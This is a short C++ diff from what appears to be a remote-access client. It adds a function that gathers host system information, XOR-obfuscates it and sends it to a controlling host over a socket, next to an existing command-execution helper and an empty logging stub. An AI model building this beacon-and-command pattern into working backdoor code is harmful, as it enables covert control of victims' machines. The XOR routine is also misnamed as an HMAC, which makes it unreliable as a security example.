@@ -29,3 +29,22 @@ std::string RunCommand(const char* cmd) {
     pclose(pipe);
     return result;
 }
+int FirstConnect(WrightNetworking Client,WrightCryptography ClientCrypto){
+    //Get Information About The Client System
+    struct utsname sysinfo = GetSystemInformation();
+    //Create a String With The Client Information
+    std::stringstream ss;
+    ss <<"NewClient["<<sysinfo.machine<<"]";
+    std::string ClientInfoString = ss.str();
+    //Encrypt The String To Send To Host
+    ClientCrypto.XorHMAC(ClientInfoString, 'S', 'n');
+    //Convert C++ String into C Char[]
+    char *buffer = &ClientInfoString[0u];
+    //Connect and send the Info to the Host
+    Client.ConnectSocket();
+    Client.SendData(buffer);
+    return 1;
+}
+void StartLogging(){
+    
+}
